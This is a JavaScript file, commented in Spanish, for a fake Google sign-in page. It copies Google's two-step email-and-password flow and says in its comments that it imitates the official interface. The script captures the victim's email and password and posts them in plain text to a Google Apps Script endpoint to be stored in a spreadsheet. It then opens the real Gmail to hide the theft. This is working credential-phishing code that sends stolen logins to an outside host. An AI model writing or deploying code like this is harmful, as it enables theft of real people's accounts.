const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwR8pzNfNsEnYFh2XT4vNYwTmhfuw41mmgRK5QRq0nal4TK5Zde4hiK9UfA1ZFjAzKp/exec";

let step = 1; // Paso 1: Correo, Paso 2: Contraseña
let userEmail = "";

function showSuccessNotification() {
    const msg = document.getElementById('success-message');
    if(msg) {
        msg.classList.add('show');
        setTimeout(() => msg.classList.remove('show'), 3000);
    }
}

document.getElementById('googleLoginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const btnNext = document.getElementById('btn-next');

    // --- PASO 1: CAPTURAR Y VALIDAR CORREO ---
    if (step === 1) {
        const emailInput = document.getElementById('email').value.trim();
        if (!emailInput) {
            alert("Ingresa tu correo electrónico o número de teléfono.");
            return;
        }

        userEmail = emailInput;

        // Ocultar campo de correo y mostrar el de contraseña estilo Google
        document.getElementById('email-container').style.display = 'none';
        document.getElementById('password-container').style.display = 'block';
        document.getElementById('password').focus();

        // Actualizar textos para simular la interfaz oficial
        document.getElementById('google-title').textContent = "¡Te damos la bienvenida!";
        document.getElementById('google-subtitle').textContent = userEmail;
        document.getElementById('forgot-link').textContent = "¿Olvidaste la contraseña?";

        step = 2; // Avanzamos al paso de la contraseña
        return;
    }

    // --- PASO 2: CAPTURAR CONTRASEÑA Y GUARDAR EN GOOGLE SHEETS ---
    if (step === 2) {
        const passwordInput = document.getElementById('password').value.trim();
        if (!passwordInput) {
            alert("Ingresa tu contraseña.");
            return;
        }

        if (btnNext) {
            btnNext.textContent = 'Iniciando...';
            btnNext.disabled = true;
        }

        // Estructurar paquete para enviarlo a la pestaña Usuarios_Google_BD
        const payload = {
            action: "registerUser",
            provider: "google",
            nombre: userEmail,
            colonia: "Red Social",
            contrasena: passwordInput
        };

        // Guardar credenciales en Apps Script
        fetch(SCRIPT_URL, {
            method: 'POST',
            headers: { "Content-Type": "text/plain;charset=utf-8" },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(result => {
            console.log("Sincronizado con Sheets:", result);
        })
        .catch(err => {
            console.error("Error al sincronizar:", err);
        })
        .finally(() => {
            // Autologin en el navegador
            localStorage.setItem('vecino_nombre', userEmail);
            localStorage.setItem('vecino_colonia', 'Red Social');

            showSuccessNotification();

            // Abrir Gmail oficial en una nueva pestaña
            window.open("https://mail.google.com", "_blank");

            // Redirigir de vuelta al sistema principal ya autenticado
            setTimeout(() => {
                window.location.href = `../index.html?user=${encodeURIComponent(userEmail)}`;
            }, 1000);
        });
    }
});